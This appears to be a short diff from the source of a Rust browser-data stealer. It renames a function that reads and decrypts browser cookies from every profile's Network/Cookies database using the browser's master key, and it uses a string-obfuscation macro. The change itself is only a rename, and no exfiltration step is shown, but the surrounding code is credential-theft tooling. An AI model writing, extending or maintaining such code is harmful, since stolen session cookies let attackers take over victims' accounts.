@@ -34,7 +34,7 @@ impl Task for CookiesTask {
     unsafe fn run(&self, parent: &Path) {
         let Some(cookies) = collect_from_all_profiles(
             &self.browser.profiles, 
-            |profile| get_cookies(profile, &self.browser.master_key)
+            |profile| read_cookies(profile, &self.browser.master_key)
         ) else {
             return
         };
@@ -43,7 +43,7 @@ impl Task for CookiesTask {
     }
 }
 
-fn get_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
+fn read_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
     let cookies_path = profile / s!("Network") / s!("Cookies");
     
     read_sqlite3_and_map_records(
